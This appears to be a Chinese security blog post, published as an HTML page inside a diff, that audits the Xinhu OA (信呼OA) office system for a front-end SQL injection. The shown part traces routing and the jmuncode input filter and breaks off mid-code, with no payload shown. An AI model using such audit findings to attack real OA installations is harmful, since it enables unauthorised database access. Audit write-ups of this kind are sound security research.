@@ -1,0 +1,942 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/117073339?v=4">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="FSRM">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="信呼OA前台sql注入分析路由分析审计该套源码，首先分析它的框架结构以及路由是如何传入的。 找到入口文件，index.php 12345678910111213141516171819202122232425262728293031323334&lt;?php &#x2F;***	系统主要入口*	主页：http:&#x2F;&#x2F;www.rockoa.com&#x2F;*	软件：信呼*	作者：雨中磐石(rainrock)*&#x2F;inc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="信呼OA前台sql注入分析">
+<meta property="og:url" content="http://example.com/2025/05/31/%E4%BF%A1%E5%91%BCOA_2.6.5%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="FSRM">
+<meta property="og:description" content="信呼OA前台sql注入分析路由分析审计该套源码，首先分析它的框架结构以及路由是如何传入的。 找到入口文件，index.php 12345678910111213141516171819202122232425262728293031323334&lt;?php &#x2F;***	系统主要入口*	主页：http:&#x2F;&#x2F;www.rockoa.com&#x2F;*	软件：信呼*	作者：雨中磐石(rainrock)*&#x2F;inc">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121443229.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121919449.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121936550.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121937302.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121938324.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121946871.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121948625.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121950123.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121953047.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122003222.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122006927.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122007702.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122009092.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122015394.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122018944.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122020342.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122023466.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122025821.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122029349.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507122030765.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142300334.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142303459.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142339175.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142349619.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142351997.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507142359318.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507150002506.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507150023672.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507150024929.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172206361.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172214126.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172220276.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172220083.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172222468.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172222814.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172224915.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172225475.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172226917.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172226273.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172329077.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172253803.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172302539.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172303134.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172331467.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507172353095.png">
+<meta property="article:published_time" content="2025-05-31T12:18:06.636Z">
+<meta property="article:modified_time" content="2025-07-17T16:37:18.521Z">
+<meta property="article:author" content="FSRM">
+<meta property="article:tag" content="信呼OA">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121443229.png">
+  
+  
+  
+  <title>信呼OA前台sql注入分析 - FSRM</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"yo4o5RmdPYW9bP2LZP2uPFV1-MdYXbMMI","app_key":"ibpxtrAlbUHYQ8KOkGrFgWss","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>FSRM</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://haowallpaper.com/link/common/file/previewFileImg/17231683527757184') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="信呼OA前台sql注入分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-31 20:18" pubdate>
+          2025年5月31日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          58 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">信呼OA前台sql注入分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="信呼OA前台sql注入分析"><a href="#信呼OA前台sql注入分析" class="headerlink" title="信呼OA前台sql注入分析"></a>信呼OA前台sql注入分析</h1><h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>审计该套源码，首先分析它的框架结构以及路由是如何传入的。</p>
+<p>找到入口文件，index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">/**</span><br><span class="hljs-comment">*	系统主要入口</span><br><span class="hljs-comment">*	主页：http://www.rockoa.com/</span><br><span class="hljs-comment">*	软件：信呼</span><br><span class="hljs-comment">*	作者：雨中磐石(rainrock)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;config/config.php&#x27;</span>);<br><span class="hljs-variable">$_uurl</span> 		= <span class="hljs-variable">$rock</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;rewriteurl&#x27;</span>);<br><span class="hljs-variable">$d</span> 			= <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$m</span> 			= <span class="hljs-string">&#x27;index&#x27;</span>;<br><span class="hljs-variable">$a</span> 			= <span class="hljs-string">&#x27;default&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_uurl</span> != <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>	<span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]);<span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]);<span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>	<span class="hljs-variable">$m</span>		= <span class="hljs-variable">$_uurl</span>;<br>	<span class="hljs-variable">$_uurla</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$_uurl</span>);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_uurla</span>[<span class="hljs-number">1</span>]))&#123;<span class="hljs-variable">$d</span> = <span class="hljs-variable">$_uurla</span>[<span class="hljs-number">0</span>];<span class="hljs-variable">$m</span> = <span class="hljs-variable">$_uurla</span>[<span class="hljs-number">1</span>];&#125;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_uurla</span>[<span class="hljs-number">2</span>]))&#123;<span class="hljs-variable">$d</span> = <span class="hljs-variable">$_uurla</span>[<span class="hljs-number">0</span>];<span class="hljs-variable">$m</span> = <span class="hljs-variable">$_uurla</span>[<span class="hljs-number">1</span>];<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_uurla</span>[<span class="hljs-number">2</span>];&#125;<br>	<span class="hljs-variable">$_uurla</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_uurla</span>[<span class="hljs-number">1</span>]))&#123;<br>		<span class="hljs-variable">$_uurla</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-variable">$_uurla</span>[<span class="hljs-number">1</span>]);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_uurla</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_uurlas</span>)&#123;<br>			<span class="hljs-variable">$_uurlasa</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$_uurlas</span>);<br>			<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_uurlasa</span>[<span class="hljs-number">1</span>]))<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$_uurlasa</span>[<span class="hljs-number">0</span>]]=<span class="hljs-variable">$_uurlasa</span>[<span class="hljs-number">1</span>];<br>		&#125;<br>	&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-variable">$m</span>			= <span class="hljs-variable">$rock</span>-&gt;jm-&gt;<span class="hljs-title function_ invoke__">gettoken</span>(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;index&#x27;</span>);<br>	<span class="hljs-variable">$d</span>			= <span class="hljs-variable">$rock</span>-&gt;jm-&gt;<span class="hljs-title function_ invoke__">gettoken</span>(<span class="hljs-string">&#x27;d&#x27;</span>);<br>	<span class="hljs-variable">$a</span>			= <span class="hljs-variable">$rock</span>-&gt;jm-&gt;<span class="hljs-title function_ invoke__">gettoken</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;default&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$ajaxbool</span>	= <span class="hljs-variable">$rock</span>-&gt;jm-&gt;<span class="hljs-title function_ invoke__">gettoken</span>(<span class="hljs-string">&#x27;ajaxbool&#x27;</span>, <span class="hljs-string">&#x27;false&#x27;</span>);<br><span class="hljs-variable">$mode</span>		= <span class="hljs-variable">$rock</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-variable">$m</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;install&#x27;</span>] &amp;&amp; <span class="hljs-variable">$mode</span> != <span class="hljs-string">&#x27;install&#x27;</span>)<span class="hljs-variable">$rock</span>-&gt;<span class="hljs-title function_ invoke__">location</span>(<span class="hljs-string">&#x27;?m=install&#x27;</span>);<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;include/View.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这里我直接通读全文了，config.php里面包含一些数据库的配置文件，其中new了一个rockClass类，里面过滤了一些方法。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121443229.png" srcset="/img/loading.gif" lazyload alt="image-20250712144321007"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$_uurl</span> 		= <span class="hljs-variable">$rock</span>-&gt;<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;rewriteurl&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>调用了get函数，里面传参rewriteurl，并赋值给了$_uurl。跟进get函数，查看具体的实现逻辑。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202507121919449.png" srcset="/img/loading.gif" lazyload alt="image-20250712191954125"></p>
+<p>首先将$dev赋值给$val,然后判断第一个参数是否存在，这个参数是我们可控的，如果存在的话，就将get传进去的值赋值给$val,然后再判断$val是否为空，如果为空的话，$val的值还是由$dev所赋值。</p>
+<p>这里举一个例子：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$_uurl</span> 		= <span class="hljs-variable">$rock</span>-&gt;<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;index&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>如果是这样传进去的话，最后的结果就是$val是index，如果再url中传入?a=fsrm,那么最后$val的值就是fsrm。</p>
+<p>不管如何，最后还是要经过jmuncode函数所处理，get传进去的值是第一个参数，get参数名是第三个参数，跟进去看看。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jmuncode</span>(<span class="hljs-params"><span class="hljs-variable">$s</span>, <span class="hljs-variable">$lx</span>=<span class="hljs-number">0</span>, <span class="hljs-variable">$na</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$jmbo</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable">$s</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$s</span>;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$lx</span>==<span class="hljs-number">3</span>)<br>            <span class="hljs-variable">$jmbo</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isjm</span>(<span class="hljs-variable">$s</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$s</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>)==<span class="hljs-string">&#x27;rockjm_&#x27;</span> || <span class="hljs-variable">$lx</span> == <span class="hljs-number">1</span> || <span class="hljs-variable">$jmbo</span>)&#123;<br>			<span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;rockjm_&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>			<span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;jm-&gt;<span class="hljs-title function_ invoke__">uncrypt</span>(<span class="hljs-variable">$s</span>);<br>			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$lx</span>==<span class="hljs-number">1</span>)&#123;<br>				<span class="hljs-variable">$jmbo</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isjm</span>(<span class="hljs-variable">$s</span>);<br>				<span class="hljs-keyword">if</span>(<span class="hljs-variable">$jmbo</span>)<span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;jm-&gt;<span class="hljs-title function_ invoke__">uncrypt</span>(<span class="hljs-variable">$s</span>);<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$s</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>)==<span class="hljs-string">&#x27;basejm_&#x27;</span> || <span class="hljs-variable">$lx</span>==<span class="hljs-number">5</span>)&#123;<br>			<span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;basejm_&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>			<span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;jm-&gt;<span class="hljs-title function_ invoke__">base64decode</span>(<span class="hljs-variable">$s</span>);<br>		&#125;<br>		<span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&amp;#39&#x27;</span>, <span class="hljs-variable">$s</span>);<br>		<span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;%20&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$lx</span>==<span class="hljs-number">2</span>)<br>            <span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;[H1]&#x27;</span>,<span class="hljs-string">&#x27;[H2]&#x27;</span>), <span class="hljs-variable">$s</span>);<br>		<span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$s</span>);<br>		<span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;lvlaras <span class="hljs-keyword">as</span> <span class="hljs-variable">$v1</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">contain</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$v1</span>))&#123;<br>			<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">debug</span>(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$na</span>.<span class="hljs-string">&#x27;《&#x27;</span>.<span class="hljs-variable">$s</span>.<span class="hljs-string">&#x27;》error:包含非法字符《&#x27;</span>.<span class="hljs-variable">$v1</span>.<span class="hljs-string">&#x27;》&#x27;</span>,<span class="hljs-string">&#x27;params_err&#x27;</span>);<br>			<span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">lvlarrep</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$v1</span>);<br>			<span class="hljs-variable">$str</span> = <span class="hljs-variable">$s</span>;<br>		&#125;<br>		<span class="hljs-variable">$cslv</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;ip&#x27;</span>,<span class="hljs-string">&#x27;web&#x27;</span>,<span class="hljs-string">&#x27;host&#x27;</span>,<span class="hljs-string">&#x27;ajaxbool&#x27;</span>,<span class="hljs-string">&#x27;token&#x27;</span>,<span class="hljs-string">&#x27;adminid&#x27;</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$na</span>, <span class="hljs-variable">$cslv</span>))<br>            <span 